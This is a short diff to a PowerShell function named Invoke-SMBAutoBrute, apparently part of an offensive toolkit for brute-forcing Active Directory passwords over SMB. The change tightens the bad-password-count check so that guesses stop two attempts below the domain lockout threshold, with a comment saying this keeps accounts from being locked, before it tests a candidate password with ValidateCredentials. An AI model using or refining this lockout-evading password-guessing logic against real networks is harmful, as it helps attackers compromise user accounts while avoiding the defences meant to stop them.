@@ -223,7 +223,9 @@ function Invoke-SMBAutoBrute
                 if ($validaccounts.ContainsKey($userid) -eq $false)
                 {
                     $attempts = Get-UserBadPwdCount $userid $dcs
-                    if ($attempts -ne -1 -and $attempts -lt ($LockoutThreshold - 1))
+                    
+                    #Be sure to use 2 less than the LockoutThresold so the account will not be locked out as a result of the next test.
+                    if ($attempts -ne -1 -and $attempts -le ($LockoutThreshold - 2)) 
                     {
                         $IsValid = $false
                         $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()
